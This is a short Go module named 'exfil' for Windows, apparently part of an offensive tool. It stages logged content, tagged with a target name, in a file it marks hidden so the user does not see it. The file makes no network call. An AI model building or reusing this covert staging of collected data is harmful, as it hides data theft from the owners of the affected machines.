package exfil

import (
	"fmt"
	"log"
	"os"
	"sync"

	"golang.org/x/sys/windows"
)

var once sync.Once

// internal state for the exfil
type ExfilType struct {
	initialized bool
	f           *os.File
}

// single instance of the ExfilType
var Exfil *ExfilType

// Write content to exfil
func (e *ExfilType) Write(content string) {
	if e.initialized {
		log.Println(content)
	}
}

// Performs initialization for the exfil single instance
func Initialize(target, fname string) {
	once.Do(func() {
		Exfil = &ExfilType{}
		f, err := os.OpenFile(fname, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0666)
		if err != nil {
			return
		}
		// set to hidden
		windows.SetFileAttributes(windows.StringToUTF16Ptr(f.Name()), windows.FILE_ATTRIBUTE_HIDDEN)
		Exfil.f = f
		log.SetOutput(Exfil.f)
		log.SetPrefix(fmt.Sprintf("[%s] ", target))
		Exfil.initialized = true
	})
}
